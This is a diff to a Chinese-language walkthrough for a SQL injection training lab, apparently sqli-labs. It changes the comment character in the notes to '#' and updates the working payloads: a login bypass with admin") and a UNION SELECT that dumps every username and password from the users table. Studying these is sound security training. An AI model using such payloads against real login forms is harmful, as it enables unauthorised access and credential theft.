@@ -6,6 +6,7 @@
 |---|---|
 | **注入类型** | POST · 报错型 |
 | **闭合方式** | `")` |
+| **注释符** | `# · POST 表单必须用它，--+ 会失效` |
 | **成败信号** | 数据回显 + flag.jpg |
 | **一句话** | 登录框，双引号加括号 |
 | **核心 payload** | `uname=admin") --+` |
@@ -26,11 +27,13 @@ $sql = "SELECT username, password FROM users WHERE username=($uname) and passwor
 
 和 Less-4 一个套路（双引号 + 括号），闭合用 **`")`**。
 
+> 💡 注释符同样用 `#`（POST 表单关，原因见 Less-11 那节的说明）。
+
 ### 通关 payload（实测）
 
 ```
-uname = admin") --+            →  成功  user=admin  pass=admin
-uname = -1") union select 1,group_concat(username,0x3a,password) from users--+
+uname = admin")#               →  成功  user=admin  pass=admin
+uname = -1") union select 1,group_concat(username,0x3a,password) from users#
 →  13 条账号密码全部拖出
 ```
 
